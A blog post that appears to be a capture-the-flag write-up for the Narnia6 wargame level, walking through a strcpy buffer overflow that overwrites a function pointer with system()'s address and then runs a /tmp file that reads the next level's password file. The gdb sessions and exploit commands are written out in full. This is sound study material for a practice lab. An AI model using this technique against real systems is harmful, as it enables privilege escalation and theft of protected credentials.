---
layout: post
title:  "Buffer Overflows: Narnia6"
date:   2017-07-24 14:15:50 -0400
categories: master
---


The source code:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);
	fp(b1);

	exit(1);
}
```
What's interesting about this code is the following:
```
if(((unsigned long)fp & 0xff000000) == get_sp())
	exit(-1);
```
This means that if `fp` has the same address as our stack, it doesn't get executed. Instead, the program just exits. Since any shellcode we input gets injected into the stack, we can't use this method.
We notice that this program includes `stdlib.h`, which includes the `system()` function. What we can do is overwrite `fp`, which current points to `puts()` to `system()`, which will then attempt to execute it's input.

Let's do a test run, we'll set up a break point right before the last `exit()` function:
```
(gdb) disass main
Dump of assembler code for function main:
   0x08048559 <+0>:	push   ebp
   0x0804855a <+1>:	mov    ebp,esp
   0x0804855c <+3>:	push   ebx
   0x0804855d <+4>:	and    esp,0xfffffff0
   0x08048560 <+7>:	sub    esp,0x30
[snip]
   0x080486b2 <+345>:	call   eax
   0x080486b4 <+347>:	mov    DWORD PTR [esp],0x1
   0x080486bb <+354>:	call   0x8048410 <exit@plt>
End of assembler dump.
(gdb) break *main+354
Breakpoint 1 at 0x80486bb
(gdb) run $(python -c 'print "A"*7') $(python -c 'print "B"*7')
Starting program: /narnia/narnia6 $(python -c 'print "A"*7') $(python -c 'print "B"*7')
AAAAAAA
```
We see that prints out our first buffer, which is what `puts` does.

Let's look at the stack:
```
(gdb) x/12xw $esp
0xffffd6d0:	0x00000001	0xffffd8f7	0x00000021	0x08048712
0xffffd6e0:	0x00000003	0xffffd7a4	0x42424242	0x00424242
0xffffd6f0:	0x41414141	0x00414141	0x080483f0[1]	0x00000003
```
`[1]` currently points to `puts()`:
```
(gdb) x/4i 0x080483f0
   0x80483f0 <puts@plt>:	jmp    DWORD PTR ds:0x8049968
   0x80483f6 <puts@plt+6>:	push   0x10
   0x80483fb <puts@plt+11>:	jmp    0x80483c0
   0x8048400 <__gmon_start__@plt>:	jmp    DWORD PTR ds:0x804996c
```
We'll need to overwrite this address with `system()`. In gdb, we can get the address of a function using `print`:
```
(gdb) print &system
$1 = (<text variable, no debug info> *) 0xf7e62e70 <system>
```
Let's inject the address into `b1`:

```
(gdb) run $(python -c 'print "A"*8 + "\x70\x2e\xe6\xf7"') $(python -c 'print "B"*7')
Starting program: /narnia/narnia6 $(python -c 'print "A"*8 + "\x70\x2e\xe6\xf7"') $(python -c 'print "B"*7')
sh: 1: AAAAAAAAp.��: not found

Breakpoint 1, 0x080486bb in main ()
(gdb) x/12xw $esp
0xffffd6d0:	0x00000001	0xffffd8f7	0x00000021	0x08048712
0xffffd6e0:	0x00000003	0xffffd7a4	0x42424242	0x00424242
0xffffd6f0:	0x41414141	0x41414141	0xf7e62e70	0x00000000
(gdb) 
```

We've successfully overwritten `fp` with `system()`. Now to leverage this exploit to get the next level's password.
The argument of `sh` is `b1`, which includes our address. Any command we could possibly inject into our buffer would include the address. To bypass this, we'll create a file `/tmp/aaa[return address]` which has the command `cat /etc/narnia_pass/narnia7`, which `system()` will execute with elevated privileges:
```
narnia6@narnia:/narnia$ echo 'cat /etc/narnia_pass/narnia7' > $(python -c 'print "/tmp/aaa" + "\x70\x2e\xe6\xf7"')
```
We'll have to add executable rights to the file. 
```
narnia6@narnia:/narnia$ chmod 777 $(python -c 'print "/tmp/aaa" + "\x70\x2e\xe6\xf7"')
```
And finally we run the code:
```
narnia6@narnia:/narnia$ ./narnia6 $(python -c 'print "/tmp/aaa" + "\x70\x2e\xe6\xf7"') $(python -c 'print "B"*7')
[password]
```
Which gives us the password.
